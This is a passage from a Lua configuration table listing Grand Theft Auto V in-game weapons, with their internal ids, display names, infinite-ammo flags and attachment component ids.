'~s~~s~Default Magazine', id = 'COMPONENT_ASSAULTSMG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_ASSAULTSMG_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } } } }, CombatPDW = { id = 'weapon_combatpdw', name = '~s~~s~Combat PDW', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_COMBATPDW_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_COMBATPDW_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_COMBATPDW_CLIP_03' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, MachinePistol = { id = 'weapon_machinepistol', name = '~s~~s~Machine Pistol ', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MACHINEPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MACHINEPISTOL_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_MACHINEPISTOL_CLIP_03' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, MiniSMG = { id = 'weapon_minismg', name = '~s~~s~Mini SMG', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MINISMG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MINISMG_CLIP_02' } } } }, UnholyHellbringer = { id = 'weapon_raycarbine', name = '~s~~s~Unholy Hellbringer', bInfAmmo = false, mods = {} } }, Shotguns = { PumpShotgun = { id = 'weapon_pumpshotgun', name = '~s~~s~Pump Shotgun', bInfAmmo = false, mods = { Flashlight = { { name = 'Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_SR_SUPP' } } } }, PumpShotgunMkII = { id = 'weapon_pumpshotgun_mk2', name = '~s~~s~Pump Shotgun Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Shells', id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_01' }, { name = '~s~~s~Dragon Breath Shells', id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Steel Buckshot Shells', id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~Flechette Shells', id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT' }, { name = '~s~~s~Explosive Slugs', id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_MK2' }, { name = '~s~~s~Medium Scope', id = 'COMPONENT_AT_SCOPE_SMALL_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_SR_SUPP_03' }, { name = '~s~~s~Squared Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_08' } } } }, SawedOffShotgun = { id = 'weapon_sawnoffshotgun', name = '~s~~s~Sawed-Off Shotgun', bInfAmmo = false, mods = {} }, AssaultShotgun = { id = 'weapon_assaultshotgun', name = '~s~~s~Assault Shotgun', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, BullpupShotgun = { id = 'weapon_bullpupshotgun', name = '~s~~s~Bullpup Shotgun', bInfAmmo = false, mods = { Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, Musket = { id = 'weapon_musket', name = '~s~~s~Musket', bInfAmmo = false, mods = {} }, HeavyShotgun = { id = 'weapon_heavyshotgun', name = '~s~~s~Heavy Shotgun', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_HEAVYSHOTGUN_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, DoubleBarrelShotgun = { id = 'weapon_dbshotgun', name = '~s~~s~Double Barrel Shotgun', bInfAmmo = false, mods = {} }, SweeperShotgun = { id = 'weapon_autoshotgun', name = '~s~~s~Sweeper Shotgun', bInfAmmo = false, mods = {} } }, AssaultRifles = { AssaultRifle = { id = 'weapon_assaultrifle', name = '~s~~s~Assault Rifle', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_ASSAULTRIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_ASSAULTRIFLE_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_ASSAULTRIFLE_CLIP_03' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, AssaultRifleMkII = { id = 'weapon_assaultrifle_mk2', name = '~s~~s~Assault Rifle Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_MK2' }, { name = '~s~~s~Large Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_AR_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_AR_BARREL_0' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02' } } } }, CarbineRifle = { id = 'weapon_carbinerifle', name = '~s~~s~Carbine Rifle', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_CARBINERIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_CARBINERIFLE_CLIP_02' }, { name = '~s~~s~Box Magazine', id = 'COMPONENT_CARBINERIFLE_CLIP_03' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, CarbineRifleMkII = { id = 'weapon_carbinerifle_mk2', name = '~s~~s~Carbine Rifle Mk II ', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_MK2' }, { name = '~s~~s~Large Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_CR_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_CR_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02' } } } }, AdvancedRifle = { id = 'weapon_advancedrifle', name = '~s~~s~Advanced Rifle ', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_ADVANCEDRIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_ADVANCEDRIFLE_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' } } } }, SpecialCarbine = { id = 'weapon_specialcarbine', name = '~s~~s~Special Carbine', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SPECIALCARBINE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SPECIALCARBINE_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_SPECIALCARBINE_CLIP_03' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, SpecialCarbineMkII = { id = 'weapon_specialcarbine_mk2', name = '~s~~s~Special Carbine Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_MK2' }, { name = '~s~~s~Large Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_SC_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_SC_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02' } } } }, BullpupRifle = { id = 'weapon_bullpuprifle', name = '~s~~s~Bullpup Rifle', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_BULLPUPRIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_BULLPUPRIFLE_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, BullpupRifleMkII = { id = 'weapon_bullpuprifle_mk2', name = '~s~~s~Bullpup Rifle Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Armor Piercing Rounds', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_02_MK2' }, { name = '~s~~s~Medium Scope', id = 'COMPONENT_AT_SCOPE_SMALL_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_BP_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_BP_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, CompactRifle = { id = 'weapon_compactrifle', name = '~s~~s~Compact Rifle', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_COMPACTRIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_COMPACTRIFLE_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_COMPACTRIFLE_CLIP_03' } } } } }, LMG = { MG = { id = 'weapon_mg', name = '~s~~s~MG', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MG_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL_02' } } } }, CombatMG = { id = 'weapon_combatmg', name = '~s~~s~Combat MG', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_COMBATMG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_COMBATMG_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, CombatMGMkII = { id = 'weapon_combatmg_mk2', name = '~s~~s~Combat MG Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_COMBATMG_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_COMBATMG_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_COMBATMG_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_COMBATMG_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Medium Scope', id = 'COMPONENT_AT_SCOPE_SMALL_MK2' }, { name = '~s~~s~Large Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_MG_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_MG_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02' } } } }, GusenbergSweeper = { id = 'weapon_gusenberg', name = '~s~~s~GusenbergSweeper', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_GUSENBERG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_GUSENBERG_CLIP_02' } } } } }, Snipers = { SniperRifle = { id = 'weapon_sniperrifle', name = '~s~~s~Sniper Rifle', bInfAmmo = false, mods = { Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_LARGE' }, { name = '~s~~s~Advanced Scope', id = 'COMPONENT_AT_SCOPE_MAX' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } } } }, HeavySniper = { id = 'weapon_heavysniper', name = '~s~~s~Heavy Sniper', bInfAmmo = false, mods = { Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_LARGE' }, { name = '~s~~s~Advanced Scope', id = 'COMPONENT_AT_SCOPE_MAX' } } } }, HeavySniperMkII = { id = 'weapon_heavysniper_mk2', name = '~s~~s~Heavy Sniper Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_02' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Armor Piercing Rounds', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ' }, { name = '~s~~s~Explosive Rounds', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE' } }, Sights = { { name = '~s~~s~Zoom Scope', id = 'COMPONENT_AT_SCOPE_LARGE_MK2' }, { name = '~s~~s~Advanced Scope', id = 'COMPONENT_AT_SCOPE_MAX' }, { name = '~s~~s~Nigt Vision Scope', id = 'COMPONENT_AT_SCOPE_NV' }, { name = '~s~~s~Thermal Scope', id = 'COMPONENT_AT_SCOPE_THERMAL' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_SR_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_SR_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_SR_SUPP_03' }, { name = '~s~~s~Squared Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_08' }, { name = '~s~~s~Bell-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_09' } } } }, MarksmanRifle = { id = 'weapon_marksmanrifle', name = '~s~~s~Marksman Rifle', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MARKSMANRIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MARKSMANRIFLE_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, MarksmanRifleMkII = { id = 'weapon_marksmanrifle_mk2', name = '~s~~s~Marksman Rifle Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Large Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2' }, { name = '~s~~s~Zoom Scope', id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_MRFL_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_MRFL_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02' } } } } }, Heavy = { RPG = { id = 'weapon_rpg', name = '~s~~s~RPG', bInfAmmo = false, mods = {} }, GrenadeLauncher = { id = 'weapon_grenadelauncher', name = '~s~~s~Grenade Launcher', bInfAmmo = false, mods = {} }, GrenadeLauncherSmoke = { id = 'weapon_grenadelauncher_smoke', name = '~s~~s~Grenade Launcher Smoke', bInfAmmo = false, mods = {} }, Minigun = { id = 'weapon_minigun', name = '~s~~s~Minigun', bInfAmmo = false, mods = {} }, FireworkLauncher = { id = 'weapon_firework', name = '~s~~s~Firework Launcher', bInfAmmo = false, mods = {} }, Railgun = { id = 'weapon_railgun', name = '~s~~s~Railgun', bInfAmmo = false, mods = {} }, HomingLauncher = { id = 'weapon_hominglauncher', name = '~s~~s~Homing Launcher', bInfAmmo = false, mods = {} }, CompactGrenadeLauncher = { id = 'weapon_compactlauncher', name = '~s~~s~Compact Grenade Launcher', bInfAmmo = false, mods = {} }, Widowmaker = { id = 'weapon_rayminigun', name = '~s~~s~Widowmaker', bInfAmmo = false, mods = {} } }, Throwables = { Grenade = { id = 'weapon_grenade', name = '~s~~s~Grenade', bInfAmmo = false, mods = {} }, BZGas = { id = 'weapon_bzgas', name = '~s~~s~BZ Gas', bInfAmmo = false, mods = {} }, MolotovCocktail = { id = 'weapon_molotov', name = '~s~~s~Molotov Cocktail', bInfAmmo = false, mods = {} }, StickyBomb = { id = 'weapon_stickybomb', name = '~s~~s~Sticky Bomb', bInfAmmo = false, mods = {} }, ProximityMines = { id = 'weapon_proxmine', name = '~s~~s~Proximity Mines', bInfAmmo = false, mods = {} }, Snowballs = { id = 'weapon_snowball', name = '~s~~s~Snowballs', bInfAmmo = false, mods = {} }, PipeBombs = { id = 'weapon_pipebomb', name = '~s~~s~Pipe Bombs', bInfAmmo = false, mods = {} }, Baseball = { id = 'weapon_ball', name = '~s~~s~Baseball', bInfAmmo = false, mods = {} }, TearGas = { id = 